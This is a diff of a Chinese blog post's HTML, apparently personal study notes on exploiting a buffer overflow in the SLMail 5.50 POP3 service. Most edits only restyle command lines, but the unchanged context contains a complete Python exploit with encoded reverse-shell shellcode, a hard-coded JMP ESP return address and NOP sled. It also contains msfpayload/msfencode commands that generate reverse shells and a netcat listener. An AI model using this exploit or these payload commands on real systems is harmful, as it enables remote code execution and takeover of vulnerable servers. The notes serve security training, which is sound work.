@@ -87,7 +87,7 @@
 <meta property="og:site_name" content="Tomas&#39;Blog">
 <meta property="og:description" content="FUZZER（window缓存区溢出）  SLMail 5.50 Mail Server（默认安装，About NT User Import，no instead） ImmunityDebugger_1_85_setup.exe（要安装python2.7版本，不可3.0） mona.py（Github上下载）     window上看开启的服务 1.netstat -nao（cmd） 2.se">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-12-11T14:40:04.940Z">
+<meta property="og:updated_time" content="2019-12-13T11:59:55.102Z">
 <meta name="twitter:card" content="summary">
 
 
@@ -373,7 +373,7 @@
 <li>标准RFC（查询协议的参数，进行学习）</li>
 </ul>
 </li>
-<li>./01.py（测试是否能连接POP3服务器）</li>
+<li><strong><code>🔺命令：./01.py</code></strong>（测试是否能连接POP3服务器）</li>
 </ul>
 </li>
 </ol>
@@ -384,7 +384,7 @@
 <ul>
 <li>测试PASS命令接收到大量数据是否会溢出（需要发送的数据大于缓冲区）</li>
 <li>EIP寄存器存放下一条指令的地址（首先关注EIP，ESP，EDP，可使指向shell code的地址）</li>
-<li>./02.py</li>
+<li><strong><code>🔺命令：./02.py</code></strong></li>
 </ul>
 </li>
 </ol>
@@ -398,7 +398,7 @@
 <li><p>FUZZING</p>
 <ul>
 <li>2700个字符实现EIP寄存器溢出</li>
-<li>./03.py</li>
+<li><strong><code>🔺命令：./03.py</code></strong></li>
 </ul>
 </li>
 </ol>
@@ -408,9 +408,9 @@
 <li>找到精确溢出的4个字节<ul>
 <li>二分法</li>
 <li>唯一字串法</li>
-<li>usr/share/metasploit-framwork/tools/exploit/pattern_create.rb -l 2700</li>
-<li>./pattern_offset.rb EIP的4个十六进制数字（通过工具找到位置）</li>
-<li>./04.py</li>
+<li><strong><code>🔺命令：./usr/share/metasploit-framwork/tools/exploit/pattern_create.rb -l 2700</code></strong></li>
+<li><strong><code>🔺命令：./pattern_offset.rb EIP的4个十六进制数字</code></strong>（通过工具找到位置）</li>
+<li><strong><code>🔺命令：./04.py</code></strong></li>
 </ul>
 </li>
 </ul>
@@ -418,7 +418,7 @@
 
 <ul>
 <li>找到精确溢出的4个字节<ul>
-<li>./05.py</li>
+<li><strong><code>🔺命令：./05.py</code></strong></li>
 </ul>
 </li>
 </ul>
@@ -436,7 +436,7 @@ ESP存放着EIP溢出的内容，可以填放shell code作为远程执行代码<
 </ul>
 </li>
 <li>寻找可存放Shellcode的内容空间</li>
-<li>./06.py（查看ESP寄存器可存放多少个字符）</li>
+<li><strong><code>🔺命令：./06.py</code></strong>（查看ESP寄存器可存放多少个字符）</li>
 </ul>
 </li>
 </ol>
@@ -451,7 +451,7 @@ ESP存放着EIP溢出的内容，可以填放shell code作为远程执行代码<
 <li>null byte（0x00）空字符，用于终止字符串拷贝的操作</li>
 <li>return（0x0D）回车操作，表示POP3 PASS命令输入完成</li>
 <li>思路：发送0x00–0xff 256个字符，查找所有的坏字符</li>
-<li>./07.py（查找坏字符）</li>
+<li><strong><code>🔺命令：./07.py</code></strong>（查找坏字符）</li>
 <li>0x0A（导致后面数据无法出现）</li>
 <li>0x0D（被过滤）</li>
 <li>0x00（被过滤）</li>
@@ -498,7 +498,7 @@ SafeSEH、ASLR：操作系统提供的内存保护机制，为False
 OS DLL：操作系统自带的动态链接库，为True</code></pre></blockquote>
 <ul>
 <li>将汇编指令JMP ESP转换为二进制<ul>
-<li>./nasm shell</li>
+<li><strong><code>🔺命令：./nasm shell</code></strong></li>
 <li>FFE4</li>
 </ul>
 </li>
@@ -526,7 +526,7 @@ Memory Map内存地址图查看模块对应的基地址是否收到DEP,ALSR的�
 </ul>
 </li>
 <li>重发buffer（小端存储 → 地址完全翻转）<ul>
-<li>./08.py（查看模块指令的地址是否为ESP的地址）</li>
+<li><strong><code>🔺命令：./08.py</code></strong>（查看模块指令的地址是否为ESP的地址）</li>
 </ul>
 </li>
 </ul>
@@ -538,9 +538,9 @@ Memory Map内存地址图查看模块对应的基地址是否收到DEP,ALSR的�
 <li>生成Shellcode（注意坏字符）</li>
 <li>Scratch（写Shellcode的工具）</li>
 <li>cd /usr/share/framework2</li>
-<li>./msfpayload -l</li>
-<li>./msfpayload win32_reverse LHOST=反向IP地址 LPORT=反向端口 C</li>
-<li>./msfpayload win32_reverse LHOST=IP地址 LPORT=443 R | ./msfencode -b “\x00\x0a\x0d”（最后需要用”+”进行连接）</li>
+<li><strong><code>🔺命令：./msfpayload -l</code></strong></li>
+<li><strong><code>🔺命令：./msfpayload win32_reverse LHOST=反向IP地址 LPORT=反向端口 C</code></strong></li>
+<li><strong><code>🔺命令：./msfpayload win32_reverse LHOST=IP地址 LPORT=443 R | ./msfencode -b &quot;\x00\x0a\x0d&quot;</code></strong>（最后需要用”+”进行连接）</li>
 </ul>
 </li>
 </ol>
@@ -551,8 +551,8 @@ win32_bind    增加监听的进程，可以开启相应的端口
 ▲ 反向（reserver）的bind，服务端会开放端口，主动连接外部网络
 ▲ msfencode可对Shellcode做免杀，也可以编掉坏字符，进行编码需要指定原始格式 R</code></pre></blockquote>
 <ul>
-<li>nc -vlp 443</li>
-<li>./09.py（脚本后门）</li>
+<li>**`🔺命令：nc -vlp 443</li>
+<li><strong><code>🔺命令：./09.py</code></strong>（脚本后门）</li>
 </ul>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">shellcode=(</span><br><span class="line">&quot;\x6a\x48\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x7c\xac\x3f&quot;+</span><br><span class="line">&quot;\xac\x83\xeb\xfc\xe2\xf4\x80\xc6\xd4\xe1\x94\x55\xc0\x53\x83\xcc&quot;+</span><br><span class="line">&quot;\xb4\xc0\x58\x88\xb4\xe9\x40\x27\x43\xa9\x04\xad\xd0\x27\x33\xb4&quot;+</span><br><span class="line">&quot;\xb4\xf3\x5c\xad\xd4\xe5\xf7\x98\xb4\xad\x92\x9d\xff\x35\xd0\x28&quot;+</span><br><span class="line">&quot;\xff\xd8\x7b\x6d\xf5\xa1\x7d\x6e\xd4\x58\x47\xf8\x1b\x84\x09\x49&quot;+</span><br><span class="line">&quot;\xb4\xf3\x58\xad\xd4\xca\xf7\xa0\x74\x27\x23\xb0\x3e\x47\x7f\x80&quot;+</span><br><span class="line">&quot;\xb4\x25\x10\x88\x23\xcd\xbf\x9d\xe4\xc8\xf7\xef\x0f\x27\x3c\xa0&quot;+</span><br><span class="line">&quot;\xb4\xdc\x60\x01\xb4\xec\x74\xf2\x57\x22\x32\xa2\xd3\xfc\x83\x7a&quot;+</span><br><span class="line">&quot;\x59\xff\x1a\xc4\x0c\x9e\x14\xdb\x4c\x9e\x23\xf8\xc0\x7c\x14\x67&quot;+</span><br><span class="line">&quot;\xd2\x50\x47\xfc\xc0\x7a\x23\x25\xda\xca\xfd\x41\x37\xae\x29\xc6&quot;+</span><br><span class="line">&quot;\x3d\x53\xac\xc4\xe6\xa5\x89\x01\x68\x53\xaa\xff\x6c\xff\x2f\xef&quot;+</span><br><span class="line">&quot;\x6c\xef\x2f\x53\xef\xc4\xbc\x04\x5b\xc6\x1a\xc4\x3e\x17\x1a\xff&quot;+</span><br><span class="line">&quot;\xb6\x4d\xe9\xc4\xd3\x55\xd6\xcc\x68\x53\xaa\xc6\x2f\xfd\x29\x53&quot;+</span><br><span class="line">&quot;\xef\xca\x16\xc8\x59\xc4\x1f\xc1\x55\xfc\x25\x85\xf3\x25\x9b\xc6&quot;+</span><br><span class="line">&quot;\x7b\x25\x9e\x9d\xff\x5f\xd6\x39\xb6\x51\x82\xee\x12\x52\x3e\x80&quot;+</span><br><span class="line">&quot;\xb2\xd6\x44\x07\x94\x07\x14\xde\xc1\x1f\x6a\x53\x4a\x84\x83\x7a&quot;+</span><br><span class="line">&quot;\x64\xfb\x2e\xfd\x6e\xfd\x16\xad\x6e\xfd\x29\xfd\xc0\x7c\x14\x01&quot;+</span><br><span class="line">&quot;\xe6\xa9\xb2\xff\xc0\x7a\x16\x53\xc0\x9b\x83\x7c\x57\x4b\x05\x6a&quot;+</span><br><span class="line">&quot;\x46\x53\x09\xa8\xc0\x7a\x83\xdb\xc3\x53\xac\xc4\xcf\x26\x78\xf3&quot;+</span><br><span class="line">&quot;\x6c\x53\xaa\x53\xef\xac&quot;)</span><br><span class="line">buffer=&apos;A&apos;*2607+&apos;\x8f\x35\x4a\x5f&apos;+&apos;\x90&apos;*8+shellcode</span><br><span class="line">try:</span><br><span class="line">    print &quot;\nSending evil buffer...&quot;</span><br><span class="line">    s.connect((&quot;IP地址&quot;,110))</span><br><span class="line">    data=s.recv(1024)</span><br><span class="line">    s.send(&apos;USER test&apos;+&apos;\r\n&apos;)</span><br><span class="line">    data=s.recv(1024)</span><br><span class="line">    s.send(&apos;PASS&apos;+buffer+&apos;\r\n&apos;)</span><br><span class="line">    print &quot;\nDone!&quot;</span><br><span class="line">except:</span><br><span class="line">    print &quot;Could not connect to POP3!&quot;</span><br></pre></td></tr></table></figure>
 
@@ -564,7 +564,7 @@ win32_bind    增加监听的进程，可以开启相应的端口
 <li>早期的msfpayload<ul>
 <li>Shellcode执行后会一ExitProcess方式退出整个进程，将导致邮件服务崩溃</li>
 <li>SLMail是一个基于线程的应用，适用ExitThread方式可以避免整个系统崩溃，可实现重复溢出</li>
-<li>./msfpayload win32_reverser LHOST=反向IP地址 EXITFUNC=thread LPORT=443 R | ./msfencode -b “\x00\x0a\x0d”</li>
+<li><strong><code>🔺命令：./msfpayload win32_reverser LHOST=反向IP地址 EXITFUNC=thread LPORT=443 R | ./msfencode -b &quot;\x00\x0a\x0d&quot;</code></strong></li>
 </ul>
 </li>
 </ul>
@@ -620,8 +620,8 @@ win32_bind    增加监听的进程，可以开启相应的端口
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2019/12/13/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%8C%E5%8D%81%E5%85%AB)%EF%BC%9ALinux%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/" rel="prev" title="Kali Linux笔记(二十八)：Linux缓冲区溢出">
-                Kali Linux笔记(二十八)：Linux缓冲区溢出 <i class="fa fa-chevron-right"></i>
+              <a href="/2019/12/13/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%8C%E5%8D%81%E5%85%AB)%EF%BC%9ALinux%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/" rel="prev" title="Kali Linux笔记(二十七)：Linux缓冲区溢出">
+                Kali Linux笔记(二十七)：Linux缓冲区溢出 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -694,7 +694,7 @@ win32_bind    增加监听的进程，可以开启相应的端口
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">36</span>
+                  <span class="site-state-item-count">39</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
